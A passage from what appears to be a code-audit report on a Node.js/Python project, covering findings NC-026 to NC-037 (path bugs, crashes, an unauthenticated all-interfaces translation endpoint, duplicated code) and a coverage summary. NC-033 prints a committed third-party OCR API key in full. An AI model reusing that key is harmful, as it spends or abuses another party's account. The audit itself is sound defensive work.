- failure scenario: On a Debian desktop, an RPC app without explicit `STATIC_PATHS` running as root serves `/static` from `/opt/www/static` and `/opt/www/wwwroot` (created empty by `StaticServer._addStaticRoute`). Laravel, pycore and `globaldir.mapWebPath` use `/www/wwwroot` (or `/www/www/wwwroot` on NTFS dual-boot). Files placed by the other ends 404. As non-root, `/www` is used, but `'www'` is appended again.
- evidence: Only the `isProduction` branch (headless Linux) uses `globalDir.WWW_BASE`/`mapWebPath`.
- suggested fix: Use `globalDir.mapWebPath()` on every Linux branch.

### NC-026 — `osVersion` uses `os.type()`, which is always `'Linux'` on Linux, so the per-distro directories (`.dev_<distro>`, `applications_<distro>`) collapse to `.dev_linux`/`applications_linux` for Debian, Ubuntu and Kali alike.
- severity: low · category: correctness · confidence: confirmed
- location: `ncore/global_vars/global_dir/globaldir.js:44-67,71-72,110-112`; the same logic in `config/index.js:19-38` (out of scope, noted in Cross-scope)
- failure scenario: On a multi-boot machine sharing `/www` (AGENTS.md targets Ubuntu, Debian and Kali together), compilers and apps installed under `/www/.dev_linux` by Debian 13 are reused by Ubuntu 22.04. The result is glibc/ABI mismatches (for example `GLIBC_2.38 not found`) on the older distro.
- evidence: Node docs: `os.type()` returns `'Linux'` on Linux. The `distro.includes('Ubuntu')` branches are dead.
- suggested fix: Read `ID`/`VERSION_ID` from `/etc/os-release` (the helper `getOsVarTag()` already exists in `system_paths.js:118-141`).

### NC-027 — `RouterManager.logRequest` dereferences the `User-Agent` header without a guard, so every RPC-app route returns 500 to clients that send no User-Agent (Node `http.request`, raw sockets).
- severity: low · category: crash · confidence: confirmed
- location: `ncore/utils/rpc/http_rpc/libs/RouterManager.js:56-62,69-71` (`truncateUserAgent(undefined)` → `undefined.indexOf`); byte-identical copy `ncore/foundation/express_utils/libs/RouterManager.js`
- failure scenario: `http.get('http://host:15452/voice_status')` from a Node script → `TypeError` in the route middleware → Express default error handler → 500.
- evidence: `logRequest` is the first middleware on every `addRouteHandler` route (`:176`).
- suggested fix: `const userAgent = req.get('User-Agent') || '';`.

### NC-028 — The translation HTTP service binds all interfaces (no host argument) while logging `localhost`, which exposes an unauthenticated `/translate` that spends the configured provider API quota.
- severity: low · category: security · confidence: confirmed
- location: `ncore/utils/translation/http_service.js:59,82-84` (`app.listen(port, …)`, default 36315)
- failure scenario: Any LAN host POSTs `/translate` in a loop, and the owner's translation API key is billed.
- evidence: `server.listen(port)` without a host binds `::`/`0.0.0.0`.
- suggested fix: `app.listen(port, '127.0.0.1')`, or take the host from `service_contract`.

### NC-029 — The foundation `spawnAsync` idle timer is never cleared on `close`, so its callback fires after the process exits with `success:true` even when the command failed. `pipeExecCmdAsync` passes its arguments in the wrong order, and its first output kills the process through `TypeError: callback is not a function` inside a timer.
- severity: low · category: crash · confidence: confirmed (latent: `pipeExecCmdAsync` has no caller today)
- location: `ncore/foundation/common/commander.js:405-412,439-451` (no `clearTimeout` on close/error), `:557-559` (`spawnAsync(command, useShell, cwd, inheritIO, env)` against the signature `(command, info, cwd, callback, timeout, progressCallback)`, so `callback = true`, `timeout = process.env`); the same mismatch in `ncore/utils/dev_tool/lang_deploy/libs/commander.js:352-354`
- failure scenario: The first caller of `pipeExecCmdAsync('npm i')`: 1 ms after the first stdout chunk (`setTimeout(fn, NaN)`), `true(...)` throws in the timer, which is an uncaught exception, and the process exits.
- evidence: See the lines above.
- suggested fix: Clear the timer on `close`/`error`, and map `pipeExecCmdAsync` arguments explicitly.

### NC-030 — `main.js` interactive app selection calls an undefined `logger` when `apps/` is empty, so the process dies with a `ReferenceError` instead of the intended message.
- severity: low · category: crash · confidence: confirmed
- location: `main.js:53-57` (`logger.error(...)`; only `this.logger` exists, assigned later at `:151-152`)
- failure scenario: `node main.js` with no `--app` on a checkout whose `apps/` has no app directories → `ReferenceError: logger is not defined`.
- evidence: There is no module-scope `logger` binding in `main.js`.
- suggested fix: Use `console.error` there, or require `#@logger` at the top.

### NC-031 — `VideoCompressor.compress` resolves as success even when ffmpeg fails, and its progress callback reads stdout, while ffmpeg writes progress to stderr.
- severity: low · category: correctness · confidence: confirmed
- location: `ncore/utils/video/libs/videoCompressor.js:132-148` (`spawnAsync(...).then(() => resolve())`; `spawnAsync` resolves `{success:false}` on a non-zero exit), `ncore/foundation/common/commander.js:429-437` (the stderr handler passes `stdoutData` to `progressCallback`); `:57-66` (`execCmd(args)` joins the argv with spaces, so input paths with spaces break, the PR-004 pattern)
- failure scenario: A corrupt input or a full disk → ffmpeg exits 1 → the VideoCompression app reports "compressed", with a missing or zero-byte output, and no progress lines are ever logged.
- evidence: See the lines above.
- suggested fix: Check `result.success`, and pass stderr to the progress callback.

### NC-032 — `execCmd`, `execCommand` and `spawnAsync` (and the `plattool`/`porttool` copies) change the process-global cwd with `process.chdir`. That throws `ERR_WORKER_UNSUPPORTED_OPERATION` inside worker threads and races with concurrent async code.
- severity: low · category: race · confidence: likely
- location: `ncore/foundation/common/commander.js:245,269,346,360,398,440,449`; `ncore/foundation/utilities/plattool.js` and `ncore/utils/systool/libs/plattool.js` (11 each), `ncore/global_vars/tool/common/cmder.js:97,108,155,174`, `ncore/utils/porttool.js`, `ncore/foundation/utilities/porttool.js`
- failure scenario:
  - While `spawnAsync(cmd, …, cwd='/tmp/x')` runs (seconds), any other async code in the process that resolves relative paths or calls `process.cwd()` sees `/tmp/x`.
  - If two overlap, the first `close` restores `initialWorkingDirectory` under the second.
  - Called with a `cwd` from `apps/VoiceClientAndCaddy/basetool/threads/*` (worker threads), it throws.
  - `process.chdir(cwd)` on a missing directory throws before the `try` (`commander.js:245`), which breaks the "never throw" contract.
- evidence: `options.cwd` is already passed to the child, so the `chdir` is redundant.
- suggested fix: Drop `process.chdir`, and rely on `options.cwd`.

### NC-033 — Third-party API keys are committed in source: OCR.space (twice) and an Unsplash access key (twice).
- severity: low · category: secret · confidence: confirmed
- location: `ncore/mcp_server/file_processor/ocr_config.py:52`, `ncore/mcp_server/file_processor/ocr_engines.py:23` (`DEFAULT_FREE_OCR_API_KEY = "K84414795888957"`); `ncore/mcp_server/placeholder_image_generator/main.py:263` and `constants.py:105` (`UNSPLASH_ACCESS_KEY = "sUgz…OCs"`, sent as `Client-ID` at `main.py:401`)
- failure scenario: The keys are shared by every clone. Others exhaust the quota (Unsplash demo keys allow 50 requests/hour), so OCR and "unsplash" placeholders fail for all users, and the key owner's account can be suspended for abuse.
- evidence: It is a literal in two files, which is also a duplicated constant.
- suggested fix: Read the key from the global var center or an env var, with a single definition.

### NC-034 — Duplicate implementations (rule). Several copies of the exec layer and the HTTP stack each carry the bugs above, so any fix must be applied more than once.
- severity: low · category: rule · confidence: confirmed
- location / evidence:
  - `ncore/foundation/express_utils/libs/{UploadTools,StaticServer}.js` are byte-identical to `ncore/utils/rpc/http_rpc/libs/…`, and `RouterManager.js` differs by one `require` line. No consumer outside `foundation/express_utils` was found.
  - The commander exists in several copies:
    - `foundation/common/commander.js`;
    - `global_vars/tool/common/cmder.js` (used by `system_info.js`, `software_finder.js`, `winget.js`, `ensure_7zip.js`; `pipeExecCmd` there rethrows, unlike foundation);
    - `utils/dev_tool/lang_deploy/libs/commander.js` (no importer; its `execCommand` calls `.on()` on a `spawnSync` result and always rejects);
    - `foundation/utilities/plattool.js` and `utils/systool/libs/plattool.js`.
  - Port tools: `foundation/utilities/porttool.js`, `utils/porttool.js`, `utils/net/libs/portool.js`.
  - HTTP helpers: `foundation/utilities/httptool.js` and `utils/htmltool/libs/httptool.js`.
  - Explorer launch: `launcher/app_executable_launcher.js:60-88` and `utils/systool/libs/explorer.js:58-86`.
  - `apps/WebLocalAreaNetwork` contains 23 files byte-identical to `apps/VoiceClientAndCaddy` (`basetool/**`), including the NC-019 injection.
  - The colored `log` object is copy-pasted into `config_tool.js`, `cmder.js`, `winget.js`, `apt_utils.js`, `ffinder.js`, `soft-install/index.js` and `ensure_7zip.js` instead of `#@logger`.
- suggested fix: Keep one exec layer in foundation and one HTTP stack in `utils/rpc`, delete the dead copies, and share the voice `basetool` across both apps.

### NC-035 — Layering violations (rule): foundation depends upward on global_vars, global_vars hosts a full installer feature, and utils reaches into ncontroller.
- severity: low · category: rule · confidence: confirmed
- location / evidence:
  - `foundation → global_vars`: `foundation/utilities/arrtool.js:13`, `filetoollibs/fcopy.js:15`, `filetoollibs/fwriter.js:51`, `process_on.js:16`, `db_utils/sequelize_db.js:15`, `db_utils/sequelize-libs/sequelize_pring.js:15`, `express_utils/config/index.js:144`, `express_utils/libs/{UploadTools,StaticServer,RouterManager,RouterFinal}.js` (`#@global_vars`, `#@global_dir`, `#@gconfig`). This creates circular-require risk because global_vars requires foundation.
  - `global_vars/tool/soft-install/**` (winget, apt, ffinder, ensure_7zip) is a feature module inside the constants layer, and it depends on the `cmder.js` exec duplicate.
  - `utils/singleton_browser/main.js:47` requires `#@platform_detector` (`ncontroller`).
- suggested fix: Move the installers to `ncore/utils/softinstall`, and pass paths into foundation instead of requiring global_vars.

### NC-036 — The "never `throw new Error`; log and return" rule is broken at 477 sites in scope. Several of them sit on paths whose callers expect a return value.
- severity: low · category: rule · confidence: confirmed
- location / evidence:
  - `grep -c "throw new Error"` over `ncore/`, `apps/` (minus mcp-chrome), `main.js` and `ncore_module_caller.js` gives 477.
  - Behavior-relevant examples:
    - `SingleInstanceManager.js:85-86,130-131` (rethrow, caught one level up);
    - `DualModeRunner.js:87-96` (throws on "already running");
    - `HttpRpcServer.js:31-33`;
    - `cmder.js:130-134` (`pipeExecCmd` rethrows while the foundation twin returns `null`, so the same call has two contracts);
    - `lang_deploy/libs/commander.js:137` (`execSync` unguarded);
    - `videoCompressor.js:40-46`;
    - `docker_control.js:153-155`;
    - `TampermonkeyServer.js:385`.
- suggested fix: Enforce the rule on the exec and RPC layers first, where callers depend on return values.

### NC-037 — Hardcoded UI-visible text (rule).
- severity: low · category: rule · confidence: confirmed
- location / evidence:
  - `apps/dingdoudou/lib/superCode.ts:69` (label `'超级码 · 全功能离线版'` shown in the license UI; the app has `lib/uiI18n.ts` but does not use it here);
  - `ncore/utils/rpc/http_rpc/provider/expressProvider.js:56` (`'Something broke!'` response body);
  - `ncore/utils/rpc/http_rpc/libs/RouterManager.js:232,241` (`'Internal server error' + error` returned to clients, which also leaks the error text).
- suggested fix: Route these strings through the app's i18n tables.

## Coverage

Audit halted by the lead before completion; Cross-scope and In-flight sections not written. Fully read: all 17 `focus_ncore.txt` files, `callmodule/{app,global_config}.js`, `callmodule/platform/{launcher,linux_service}.js`, `utils/rpc/http_rpc/{HttpRpcServer,ExpressServer}.js`, `http_rpc/libs/{RouterManager,StaticServer,UploadTools}.js`, `provider/expressProvider.js`, `gconfig/rpc_config.js`, `main.js`, `ncore_module_caller.js`, `cmder.js`, `lang_deploy/libs/commander.js`, `WebLocalAreaNetwork/http_controller/download.js`, `dingdoudou/lib/superCode.ts`. Partially read (grep plus targeted `sed -n`): the rest of `utils/rpc`, `launcher/`, `thread_pool/`, `heartbeat/`, `foundation/common/thread_bus.js`, `utils/mcp_server/DualModeRunner.js`, `jsmcptools/server.js`, `linux/libs/service.js`, `ncore_backend_main.py`, VoiceClientAndCaddy/WebLocalAreaNetwork controllers. Pattern sweeps only (listeners, exec interpolation, secrets, layering, throw/chdir counts) over the rest of `ncore/utils` (~80k), `ncore/mcp_server` Python and `apps/dingdoudou`, `DocumentOffline`, `matrix`. Not read: most of `puppeteer_spider_v2`, `ittools`, `ai_translator`, `electron`, `web_offline`, `flutter_icon_tool`, `smart_compression`, `wait_please` frontend. Excluded as vendored: `node_modules/`, `apps/ddk_old/*.bundle.js`.
